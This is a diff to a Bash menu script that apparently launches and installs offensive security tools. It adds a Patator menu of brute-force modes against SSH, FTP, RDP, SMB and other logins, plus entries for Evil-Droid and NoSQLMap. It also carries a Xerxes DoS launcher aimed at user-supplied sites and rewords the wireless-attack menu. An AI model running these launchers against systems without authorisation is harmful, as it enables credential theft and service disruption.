@@ -1,9 +1,9 @@
 #! /bin/bash
-VERSION=2.1.3
+VERSION=2.1.4
 #Number of tools with keyboard shortcut support
-HOWMANYTOOLS=45
+HOWMANYTOOLS=47
 BACKL="0"
-DONATIONS=3
+DONATIONS=5
 LATESTCHANGELOGLINES=22
 cd
 #############DEFAULTS###############
@@ -287,7 +287,7 @@ function banner
 	fi
 	echo -e ""$YS" 7"$CE") View public IP                             "$RS"|"$CE"     "$YS"s"$CE") Go to settings menu"
 	echo -e ""$YS" 8"$CE") View MAC"
-	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL"
+	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL           "$YS"22"$CE") Show bandwidth"
 	if [[ -f /root/ngrok ]]
 	then
 		echo -e ""$YS"10"$CE") Handshake         "$YS"16"$CE") Ngrok port forward"
@@ -300,12 +300,14 @@ function banner
 	else
 		echo -e ""$YS"11"$CE") Find WPS pin      "$RS"17"$CE") Ask ("$RS"Howdoi"$CE" tool)"
 	fi
-	echo -e ""$YS"12"$CE") WEP hacking       "$YS"18"$CE") Auto-exploit browser"
+	echo -e ""$YS"12"$CE") WEP menu          "$YS"18"$CE") Auto-exploit browser"
 	echo -e ""$YS"13"$CE") MITM              "$YS"19"$CE") Geolocate an IP"
-	echo -e ""$YS"14"$CE") Metasploit   "   
-	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e ""$YS"14"$CE") Metasploit        "$YS"20"$CE") Bruteforce login"   
+	echo -e ""$YS" 0"$CE") Exit              "$YS"21"$CE") Sqlmap automated"
 	echo "Choose: "
 	read -e YORNAA
+	#~ echo "$YORNNA"
+	#~ history -s "$YORNNA"
 	clear
 }
 function enable_wlan
@@ -563,7 +565,7 @@ function listshortcuts
 	then
 		TITLE="Fluxion"
 		NAMECD="cd /root/fluxion"
-		KSSET="./fluxion"
+		KSSET="./fluxion*"
 	elif [[ "$nn" = "2" ]]
 	then
 		TITLE="Zirikatu"
@@ -789,6 +791,16 @@ function listshortcuts
 		TITLE="Beef-xss"
 		NAMECD="cd /usr/share/beef-xss"
 		KSSET="./beef"
+	elif [[ "$nn" = "46" ]]
+	then
+		TITLE="Evil-Droid"
+		NAMECD="cd /root/Evil-Droid"
+		KSSET="./evil-droid"
+	elif [[ "$nn" = "47" ]]
+	then
+		TITLE="NoSQLMap"
+		NAMECD="cd /root/NoSQLMap"
+		KSSET="python nosqlmap.py"
 	fi
 }
 function reinstall_tools
@@ -815,10 +827,10 @@ do
 	echo -e ""$YS"12"$CE") Netdiscover  "$YS"32"$CE") Angry IP      "$YS"52"$CE") Hash Buster      "$YS"72"$CE") Demiguise"
 	echo -e ""$YS"13"$CE") KickThemOut  "$YS"33"$CE") Sniper        "$YS"53"$CE") Findsploit       "$YS"73"$CE") Dkmc"
 	echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi           "$YS"74"$CE") MITMf"
-	echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"
-	echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2"
-	echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic"
-	echo -e ""$YS"18"$CE") Katana       "$YS"38"$CE") CHAOS         "$YS"58"$CE") Empire"
+	echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"$YS"75"$CE") Netool-toolkit"
+	echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2       "$YS"76"$CE") Patator"
+	echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic           "$YS"77"$CE") Evil-Droid"
+	echo -e ""$YS"18"$CE") Katana       "$YS"38"$CE") CHAOS         "$YS"58"$CE") Empire           "$YS"78"$CE") NoSQLMap"
 	echo -e ""$YS"19"$CE") Airgeddon    "$YS"39"$CE") Routersploit  "$YS"59"$CE") Meterpr.-Paranoid"
 	echo -e ""$YS"20"$CE") Websploit    "$YS"40"$CE") Geany         "$YS"60"$CE") Dr0p1t"
 	echo -e ""$YS" b"$CE") Go back"
@@ -1048,6 +1060,18 @@ do
 	elif [[ "$REIN" = "74" ]]
 	then
 		install_mitmf
+	elif [[ "$REIN" = "75" ]]
+	then
+		install_netool
+	elif [[ "$REIN" = "76" ]]
+	then
+		install_patator
+	elif [[ "$REIN" = "77" ]]
+	then
+		install_evil_droid
+	elif [[ "$REIN" = "78" ]]
+	then
+		install_nosqlmap
 	elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
 	then
 		clear
@@ -1064,6 +1088,9 @@ do
 }
 function errors_menu
 {
+while true
+do
+clear
 TERMINALTITLE="ERRORS"
 dash_calc
 printf '\033]2;ERRORS\a'
@@ -1079,6 +1106,7 @@ echo -e ""$YS" b"$CE") Go back"
 echo -e ""$YS" 0"$CE") EXIT"
 echo -e " Choose: "
 read ERRS
+clear
 if [[ "$ERRS" = "1" ]]
 then
 	clear
@@ -1158,7 +1186,7 @@ then
 	echo -e "Error was fixed!"
 	echo -e "$PAKTGB"
 	$READAK
-elif [[ "$ERRS" = "back" || "$ERRS" = "b" ]]
+elif [[ "$ERRS" = "back" || "$ERRS" = "b" || "$ERRS" = 00 ]]
 then
 	BACKL="1"
 	break
@@ -1166,15 +1194,12 @@ elif [[ "$ERRS" = "0" ]]
 then
 	clear
 	exit
-elif [[ "$ERRS" = "00" ]]
-then
-	clear
-	exec bash "$0"
 else
 	clear
-	echo -e "Not an valid option...."
-	exec bash "$0"
+	echo -e "Not a valid option...."
+	sleep 2
 fi
+done
 }
 function keyboard_shortcuts
 {
@@ -1859,6 +1884,160 @@ do
 	fi
 done
 }
+function patator_automation
+{
+while true
+do
+		clear
+		echo -e ""$BS"Modes"$CE":"
+	pttr=$(cat <<EOF
+$YS  1$CE) ftp_login      : Brute-force FTP
+$YS  2$CE) ssh_login      : Brute-force SSH
+$YS  3$CE) telnet_login   : Brute-force Telnet
+$YS  4$CE) smtp_login     : Brute-force SMTP
+$YS  5$CE) smtp_vrfy      : Enumerate valid users using the SMTP VRFY command
+$YS  6$CE) smtp_rcpt      : Enumerate valid users using the SMTP RCPT TO command
+$YS  7$CE) finger_lookup  : Enumerate valid users using Finger
+$YS  8$CE) http_fuzz      : Brute-force HTTP/HTTPS
+$YS  9$CE) ajp_fuzz       : Brute-force AJP
+$YS 10$CE) pop_login      : Brute-force POP
+$YS 11$CE) pop_passd      : Brute-force poppassd (not POP3)
+$YS 12$CE) imap_login     : Brute-force IMAP
+$YS 13$CE) ldap_login     : Brute-force LDAP
+$YS 14$CE) smb_login      : Brute-force SMB
+$YS 15$CE) smb_lookupsid  : Brute-force SMB SID-lookup
+$YS 16$CE) rlogin_login   : Brute-force rlogin
+$YS 17$CE) vmauthd_login  : Brute-force VMware Authentication Daemon
+$YS 18$CE) mssql_login    : Brute-force MSSQL
+$YS 19$CE) oracle_login   : Brute-force Oracle
+$YS 20$CE) mysql_login    : Brute-force MySQL
+$YS 21$CE) mysql_query    : Brute-force MySQL queries
+$YS 22$CE) rdp_login      : Brute-force RDP (NLA)
+$YS 23$CE) pgsql_login    : Brute-force PostgreSQL
+$YS 24$CE) vnc_login      : Brute-force VNC
+$YS 25$CE) dns_forward    : Brute-force DNS
+$YS 26$CE) dns_reverse    : Brute-force DNS (reverse lookup subnets)
+$YS 27$CE) ike_enum       : Enumerate IKE transforms
+$YS 28$CE) snmp_login     : Brute-force SNMPv1/2 and SNMPv3
+$YS 29$CE) unzip_pass     : Brute-force the password of encrypted ZIP files
+$YS 30$CE) keystore_pass  : Brute-force the password of Java keystore files
+$YS 31$CE) sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
+$YS 32$CE) umbraco_crack  : Crack Umbraco HMAC-SHA1 password hashes
+EOF
+)
+	echo -e "$pttr"
+	echo -e "Choose: "
+	read PT
+	if [[ "$PT" = 1 ]]
+	then
+		XPT="ftp_login"
+	elif [[ "$PT" = 2 ]]
+	then
+		XPT="ssh_login"
+	elif [[ "$PT" = 3 ]]
+	then
+		XPT="telnet_login"
+	elif [[ "$PT" = 4 ]]
+	then
+		XPT="smtp_login"
+	elif [[ "$PT" = 5 ]]
+	then
+		XPT="smtp_vrfy"
+	elif [[ "$PT" = 6 ]]
+	then
+		XPT="smtp_rcpt"
+	elif [[ "$PT" = 7 ]]
+	then
+		XPT="finger_lookup"
+	elif [[ "$PT" = 8 ]]
+	then
+		XPT="http_fuzz"
+	elif [[ "$PT" = 9 ]]
+	then
+		XPT="ajp_fuzz"
+	elif [[ "$PT" = 10 ]]
+	then
+		XPT="pop_login"
+	elif [[ "$PT" = 11 ]]
+	then
+		XPT="pop_passd"
+	elif [[ "$PT" = 12 ]]
+	then
+		XPT="imap_login"
+	elif [[ "$PT" = 13 ]]
+	then
+		XPT="ldap_login"
+	elif [[ "$PT" = 14 ]]
+	then
+		XPT="smb_login"
+	elif [[ "$PT" = 15 ]]
+	then
+		XPT="smb_lookupsid"
+	elif [[ "$PT" = 16 ]]
+	then
+		XPT="rlogin_login"
+	elif [[ "$PT" = 17 ]]
+	then
+		XPT="vmauthd_login"
+	elif [[ "$PT" = 18 ]]
+	then
+		XPT="mssql_login"
+	elif [[ "$PT" = 19 ]]
+	then
+		XPT="oracle_login"
+	elif [[ "$PT" = 20 ]]
+	then
+		XPT="mysql_login"
+	elif [[ "$PT" = 21 ]]
+	then
+		XPT="mysql_query"
+	elif [[ "$PT" = 22 ]]
+	then
+		XPT="rdp_login"
+	elif [[ "$PT" = 23 ]]
+	then
+		XPT="pgsql_login"
+	elif [[ "$PT" = 24 ]]
+	then
+		XPT="vnc_login"
+	elif [[ "$PT" = 25 ]]
+	then
+		XPT="dns_forward"
+	elif [[ "$PT" = 26 ]]
+	then
+		XPT="dns_reverse"
+	elif [[ "$PT" = 27 ]]
+	then
+		XPT="ike_enum"
+	elif [[ "$PT" = 28 ]]
+	then
+		XPT="snmp_login"
+	elif [[ "$PT" = 29 ]]
+	then
+		XPT="unzip_pass"
+	elif [[ "$PT" = 30 ]]
+	then
+		XPT="keystore_pass"
+	elif [[ "$PT" = 31 ]]
+	then
+		XPT="sqlcipher_pass"
+	elif [[ "$PT" = 32 ]]
+	then
+		XPT="umbraco_crack"
+	fi
+	if [[ "$XPT" = "" ]]
+	then
+		echo -e ""$RS"Wrong choice"$CE""
+		sleep 3
+		continue
+	else
+		cd /root/patator
+		export XTP
+		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python patator.py $XPT' && echo -e "---------------------------------------" && python patator.py $XPT" & disown
+		xterm -T "PATATOR" -hold & disown
+	fi
+done
+}
 function eaphammer_automation
 {
 			while true
@@ -2296,7 +2475,7 @@ do
 	clear
 	if [[ "$DR" = "o" ]]
 	then
-		xdg-open /root/Dr0p1t-Framework/output
+		gio open /root/Dr0p1t-Framework/output
 		continue
 	fi
 	if [[ "$DR" = "u" ]]
@@ -2745,190 +2924,183 @@ function wifi_tools
 	dash_calc
 	if [[ -d /root/fluxion ]]
 	then
-		echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
+		echo -e ""$YS" 1"$CE") Fluxion               The future of MITM WPA attacks"
 	else
-		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"            Multitool-Fake AP with pass confirmation"
+		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"               The future of MITM WPA attacks"
 	fi
 	if [[ -f /usr/bin/wifite ]]
 	then
-		echo -e ""$YS" 2"$CE") Wifite             Multitool"
+		echo -e ""$YS" 2"$CE") Wifite                Automated wireless attack tool"
 	else
-		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"             Multitool"
+		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"               Automated wireless attack tool"
 	fi
 	if [[ -d /root/wifiphisher ]]
 	then
-		echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
+		echo -e ""$YS" 3"$CE") Wifiphisher           Automated phishing attacks against Wi-Fi clients"
 	else
-		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"        Multitool-Fake AP etc.."
+		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"           Automated phishing attacks against Wi-Fi clients"
 	fi
 	if [[ -d /root/Zatacker ]]
 	then
-		echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
+		echo -e ""$YS" 4"$CE") Zatacker              MITM-NMAP-Mail Spammer..(Install it manually)"
 	else
-		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"           MITM-NMAP-Mail Spammer..(Install it manually)"
+		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"              MITM-NMAP-Mail Spammer..(Install it manually)"
 	fi
 	if [[ -d /root/morpheus ]]
 	then
-		echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
+		echo -e ""$YS" 5"$CE") Morpheus              Automated Ettercap TCP/IP Hijacking Tool"
 	else
-		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"           ------------ULTIMATE MITM SUIT------------"
+		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"              Automated Ettercap TCP/IP Hijacking Tool"
 	fi
-	if [[ -d /root/osrframework ]]
+	#~ if [[ -d /root/osrframework ]]
+	#~ then
+		#~ echo -e ""$YS" 6"$CE") Osrfconsole           Checks usernames-phones to platforms etc.."
+	#~ else
+		#~ echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"           Checks usernames-phones to platforms etc.."
+	#~ fi
+	if [[ -d /root/opensource ]]
 	then
-		echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
+		echo -e ""$YS" 6"$CE") Netool-toolkit        MitM pentesting opensource toolkit"
 	else
-		echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"        Checks usernames-phones to platforms etc.."
+		echo -e ""$RS" 6"$CE") "$RS"Netool-toolkit"$CE"        MitM pentesting opensource toolkit"
 	fi
 	if [[ -d /root/hakkuframework ]]
 	then
-		echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
+		echo -e ""$YS" 7"$CE") Hakku                 Penetration testing tools"
 	else
-		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"              Multitool-mail bomb-sniffs-cracks etc.."
+		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"                 Penetration testing tools"
 	fi
 	if [[ -d /root/Trity ]]
 	then
-		echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
+		echo -e ""$YS" 8"$CE") Trity                 Advanced pentesting framework"
 	else
-		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"              Multitool-locate ip-email bombs-brutforse etc.."
+		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"                 Advanced pentesting framework"
 	fi
 	if [[ -d /root/Dracnmap ]]
 	then				
-		echo -e ""$YS" 9"$CE") Dracnmap           Many scan options"
+		echo -e ""$YS" 9"$CE") Dracnmap              Many scan options"
 	else
-		echo -e ""$RS" 9"$CE") "$RS"Dracnmap"$CE"           Many scan options"
+		echo -e ""$RS" 9"$CE") "$RS"Dracnmap"$CE"              Many scan options"
 	fi
 	if [[ -d "/usr/share/fern-wifi-cracker" ]]
 	then	
-		echo -e ""$YS"10"$CE") Fern               Wifi cracker GUI"
+		echo -e ""$YS"10"$CE") Fern                  Wifi cracker GUI"
 	else
-		echo -e ""$RS"10"$CE") "$RS"Fern"$CE"               Wifi cracker GUI"
+		echo -e ""$RS"10"$CE") "$RS"Fern"$CE"                  Wifi cracker GUI"
 	fi
 	if [[ -f /usr/sbin/netdiscover ]]
 	then	
-		echo -e ""$YS"11"$CE") Netdiscover        IPs and MACs on your net"
+		echo -e ""$YS"11"$CE") Netdiscover           Network address discovering tool"
 	else
-		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"        IPs and MACs on your net"
+		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"           Network address discovering tool"
 	fi
 	if [[ -d /root/kickthemout ]]
 	then	
-		echo -e ""$YS"12"$CE") KickThemOut        Kick clients out of your network"
+		echo -e ""$YS"12"$CE") KickThemOut           Kick devices off your network"
 	else
-		echo -e ""$RS"12"$CE") "$RS"KickThemOut"$CE"        Kick clients out of your network"
+		echo -e ""$RS"12"$CE") "$RS"KickThemOut"$CE"           Kick devices off your network"
 	fi
 	if [[ -d "/usr/share/ghost-phisher" ]]
 	then	
-		echo -e ""$YS"13"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
+		echo -e ""$YS"13"$CE") Ghost-Phisher         Fake AP,MITM,Session hijacking etc..."
 	else
-		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"      Fake AP,MITM,Session hijacking etc..."
+		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"         Fake AP,MITM,Session hijacking etc..."
 	fi
 	if [[ -d /root/The-Eye ]]
 	then	
-		echo -e ""$YS"14"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
+		echo -e ""$YS"14"$CE") The Eye               Detects ARP poisoning DNS spoofing etc..."
 	else
-		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"            Detects ARP poisoning DNS spoofing etc..."
+		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"               Detects ARP poisoning DNS spoofing etc..."
 	fi
 	if [[ -d /root/xerxes ]]
 	then	
-		echo -e ""$YS"15"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
+		echo -e ""$YS"15"$CE") Xerxes                The most powerful DoS tool(CAUTION)"
 	else
-		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"             The most powerful DoS tool(CAUTION)"
-	fi
-	#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
-	if [[ -d /root/mdk3-master ]]
-	then
-		echo -e ""$YS"16"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
-	else
-		echo -e ""$RS"16"$CE") "$RS"Mdk3-master"$CE"        Tries to lock / reboot AP and more..."
-	fi
-	if [[ -d /root/mdk3-master ]]
-	then
-		echo -e ""$YS"17"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
-	else
-		echo -e ""$RS"17"$CE") "$RS"Mdk3-master"$CE"        Tries to reboot the AP and unlock the WPS lock"
+		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"                The most powerful DoS tool(CAUTION)"
 	fi
 	if [[ -d /root/KatanaFramework ]]
 	then
-		echo -e ""$YS"18"$CE") Katana Framework   Many penetration testing features"
+		echo -e ""$YS"16"$CE") Katana Framework      Many penetration testing features"
 	else
-		echo -e ""$RS"18"$CE") "$RS"Katana Framework"$CE"   Many penetration testing features"
+		echo -e ""$RS"16"$CE") "$RS"Katana Framework"$CE"      Many penetration testing features"
 	fi
 	if [[ -d /root/airgeddon ]]
 	then
-		echo -e ""$YS"19"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
+		echo -e ""$YS"17"$CE") Airgeddon             Audit wireless networks."
 	else
-		echo -e ""$RS"19"$CE") "$RS"Airgeddon"$CE"          Evil twin-WPA WPA2-WEP-WPS and more"
+		echo -e ""$RS"17"$CE") "$RS"Airgeddon"$CE"             Audit wireless networks."
 	fi
 	if [[ -f /usr/bin/websploit ]]
 	then
-		echo -e ""$YS"20"$CE") Websploit          Wireless attack-multitool"
+		echo -e ""$YS"18"$CE") Websploit             Advanced MITM framework"
 	else
-		echo -e ""$RS"20"$CE") "$RS"Websploit"$CE"          Wireless attack-multitool"
+		echo -e ""$RS"18"$CE") "$RS"Websploit"$CE"             Advanced MITM framework"
 	fi
 	if [[ -d /etc/openvas ]]
 	then
-		echo -e ""$YS"21"$CE") Openvas            Vulnerability scanner LAN"
+		echo -e ""$YS"19"$CE") Openvas               Vulnerability scanner LAN"
 	else
-		echo -e ""$RS"21"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
+		echo -e ""$RS"19"$CE") "$RS"Openvas"$CE"               Vulnerability scanner LAN"
 	fi
 	if [[ -f /usr/bin/ipscan ]]
 	then
-		echo -e ""$YS"22"$CE") Angry IP Scanner   IP Scanner"
+		echo -e ""$YS"20"$CE") Angry IP Scanner      IP Scanner"
 	else
-		echo -e ""$RS"22"$CE") "$RS"Angry IP Scanner"$CE"   IP Scanner"
+		echo -e ""$RS"20"$CE") "$RS"Angry IP Scanner"$CE"      IP Scanner"
 	fi
 	if [[ -d /root/routersploit ]]
 	then
-		echo -e ""$YS"23"$CE") Routersploit       Find/exploit router vulnerabilities"
+		echo -e ""$YS"21"$CE") Routersploit          Find/exploit router vulnerabilities"
 	else
-		echo -e ""$RS"23"$CE") "$RS"Routersploit"$CE"       Find/exploit router vulnerabilities"
+		echo -e ""$RS"21"$CE") "$RS"Routersploit"$CE"          Find/exploit router vulnerabilities"
 	fi
 	if [[ -d /root/nWatch ]]
 	then
-		echo -e ""$YS"24"$CE") nWatch             IP scanner/OS detection"
+		echo -e ""$YS"22"$CE") nWatch                IP scanner/OS detection"
 	else
-		echo -e ""$RS"24"$CE") "$RS"nWatch"$CE"             IP scanner/OS detection"
+		echo -e ""$RS"22"$CE") "$RS"nWatch"$CE"                IP scanner/OS detection"
 	fi
 	if [[ -d /root/eternal_scanner ]]
 	then
-		echo -e ""$YS"25"$CE") Eternal scanner    Scans hosts for eternalblue vulnerabilities"
+		echo -e ""$YS"23"$CE") Eternal scanner       Scans hosts for eternalblue vulnerabilities"
 	else
-		echo -e ""$RS"25"$CE") "$RS"Eternal scanner"$CE"    Scans hosts for eternalblue vulnerabilities"
+		echo -e ""$RS"23"$CE") "$RS"Eternal scanner"$CE"       Scans hosts for eternalblue vulnerabilities"
 	fi
 	if [[ -d /root/eaphammer ]]
 	then
-		echo -e ""$YS"26"$CE") Eaphammer          Evil twin attacks against WPA2-Enterprise networks"
+		echo -e ""$YS"24"$CE") Eaphammer             Evil twin attacks against WPA2-Enterprise networks"
 	else
-		echo -e ""$RS"26"$CE") "$RS"Eaphammer"$CE"          Evil twin attacks against WPA2-Enterprise networks"
+		echo -e ""$RS"24"$CE") "$RS"Eaphammer"$CE"             Evil twin attacks against WPA2-Enterprise networks"
 	fi
 	if [[ -d /root/VMR ]]
 	then
-		echo -e ""$YS"27"$CE") VMR                Best WPS cracker, mdk3-v6"
+		echo -e ""$YS"25"$CE") VMR                   Best WPS cracker, mdk3-v6"
 	else
-		echo -e ""$RS"27"$CE") "$RS"VMR"$CE"                Best WPS cracker, mdk3-v6"
+		echo -e ""$RS"25"$CE") "$RS"VMR"$CE"                   Best WPS cracker, mdk3-v6"
 	fi
 	if [[ -d /root/netattack2 ]]
 	then
-		echo -e ""$YS"28"$CE") Netattack3         Advanced network scan and attack script"
+		echo -e ""$YS"26"$CE") Netattack3            Advanced network scan and attack script"
 	else
-		echo -e ""$RS"28"$CE") "$RS"Netattack2"$CE"         Advanced network scan and attack script"
+		echo -e ""$RS"26"$CE") "$RS"Netattack2"$CE"            Advanced network scan and attack script"
 	fi
 	if [[ -f /usr/bin/wifi-pumpkin ]]
 	then
-		echo -e ""$YS"29"$CE") Wifi-Pumpkin       Framework for Rogue Wi-Fi Access Point Attack"
+		echo -e ""$YS"27"$CE") Wifi-Pumpkin          Framework for Rogue Wi-Fi Access Point Attack"
 	else
-		echo -e ""$RS"29"$CE") "$RS"Wifi-Pumpkin"$CE"       Framework for Rogue Wi-Fi Access Point Attack"
+		echo -e ""$RS"27"$CE") "$RS"Wifi-Pumpkin"$CE"          Framework for Rogue Wi-Fi Access Point Attack"
 	fi
 	if [[ -d /root/Gloom-Framework ]]
 	then
-		echo -e ""$YS"30"$CE") Gloom              Penetration Testing Framework"
+		echo -e ""$YS"28"$CE") Gloom                 Penetration Testing Framework"
 	else
-		echo -e ""$RS"30"$CE") "$RS"Gloom"$CE"              Penetration Testing Framework"
+		echo -e ""$RS"28"$CE") "$RS"Gloom"$CE"                 Penetration Testing Framework"
 	fi
 	if [[ -f /usr/bin/sechub ]]
 	then
-		echo -e ""$YS"31"$CE") secHub             Security/Hacking Kit"
+		echo -e ""$YS"29"$CE") secHub                Security/Hacking Kit"
 	else
-		echo -e ""$RS"31"$CE") "$RS"secHub"$CE"             Security/Hacking Kit"
+		echo -e ""$RS"29"$CE") "$RS"secHub"$CE"                Security/Hacking Kit"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
@@ -3035,6 +3207,22 @@ function wifi_tools
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_morpheus
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "6" ]]
+	then
+		if [[ -d "/root/opensource" ]]
+		then
+			cd /root/opensource
+			./netool.sh
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_netool
 			else
 				continue
 			fi
@@ -3199,7 +3387,7 @@ function wifi_tools
 				clear
 				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
 				sleep 4
-				xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
+				gio open http://www.isitdownrightnow.com/"$SITEDOS".html
 				clear	
 				cd /root/xerxes
 				SITEDOSX=www.$SITEDOS
@@ -3224,59 +3412,6 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "16" ]]
 	then
-		if [[ -d /root/mdk3-master ]]
-		then
-			echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
-			echo -e "Press "$YS"any key"$CE" to start scanning."
-			$READAK
-			airodump-ng $WLANNM
-			echo -e "Enter your target's BSSID: "
-			read -e MDBSSID
-			echo -e "Enter your target's channel: "
-			read -e MDCHANN
-			echo -e "Enter frames per second(e.g: 50): "
-			read -e FPS
-			clear
-			xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'	
-		else
-			echo -e "$TNI"
-			read INSTALL
-			if [[ "$INSTALL" = "install" ]]
-			then
-				install_mdk3
-			else
-				continue
-			fi
-		fi	
-	elif [[ "$APPP" = "17" ]]
-	then	
-		if [[ -d /root/mdk3-master ]]
-		then
-			echo -e "Press "$YS"any key"$CE" to start scanning with wash."
-			$READAK
-			gnome-terminal -e 'wash -i $WLANNM'
-			echo -e "Enter your target's BSSID: "
-			read -e MDBSSID
-			echo -e "Enter your target's ESSID: "
-			read -e MDESSID
-			#~ echo -e "Enter your target's channel: "
-			#~ read -e MDCHANN
-			echo -e "Enter frames per second(e.g: 50): "
-			read -e FPS
-			clear
-			xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
-		else
-			echo -e "$TNI"
-			read INSTALL
-			if [[ "$INSTALL" = "install" ]]
-			then
-				install_mdk3
-			else
-				continue
-			fi
-		fi
-	elif [[ "$APPP" = "18" ]]
-	then
 		if [[ -d "/usr/share/KatanaFramework" ]]
 		then
 			ktf.console
@@ -3290,7 +3425,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "19" ]]
+	elif [[ "$APPP" = "17" ]]
 	then
 		if [[ -d "/root/airgeddon" ]]
 		then
@@ -3307,7 +3442,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "20" ]]
+	elif [[ "$APPP" = "18" ]]
 	then
 		if [[ -d "/usr/share/websploit" ]]
 		then
@@ -3322,7 +3457,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "21" ]]
+	elif [[ "$APPP" = "19" ]]
 	then
 		if [[ -d /etc/openvas ]]
 		then
@@ -3348,7 +3483,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "22" ]]
+	elif [[ "$APPP" = "20" ]]
 	then
 		if [[ -d "/usr/lib/ipscan" ]]
 		then
@@ -3363,7 +3498,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "23" ]]
+	elif [[ "$APPP" = "21" ]]
 	then
 		if [[ -d "/root/routersploit" ]]
 		then
@@ -3380,7 +3515,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "24" ]]
+	elif [[ "$APPP" = "22" ]]
 	then
 		if [[ -d "/root/nWatch" ]]
 		then
@@ -3397,7 +3532,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "25" ]]
+	elif [[ "$APPP" = "23" ]]
 	then
 		if [[ -d "/root/eternal_scanner" ]]
 		then
@@ -3414,7 +3549,7 @@ function wifi_tools
 				continue
 			fi
 		fi
-	elif [[ "$APPP" = "26" ]]
+	elif [[ "$APPP" = "24" ]]
 	then
 		if [[ -d "/root/eaphammer" ]]
 		then
@@ -3430,7 +3565,7 @@ function wifi_tools
 			fi
 		fi
 		cd
-	elif [[ "$APPP" = "27" ]]
+	elif [[ "$APPP" = "25" ]]
 	then
 		if [[ -d "/root/VMR" ]]
 		then
@@ -3447,7 +3582,7 @@ function wifi_tools
 			fi
 		fi
 		cd
-	elif [[ "$APPP" = "28" ]]
+	elif [[ "$APPP" = "26" ]]
 	then
 		if [[ -d "/root/netattack2" ]]
 		then
@@ -3464,7 +3599,7 @@ function wifi_tools
 			fi
 		fi
 		cd
-	elif [[ "$APPP" = "29" ]]
+	elif [[ "$APPP" = "27" ]]
 	then
 		if [[ -f "/usr/bin/wifi-pumpkin" ]]
 		then
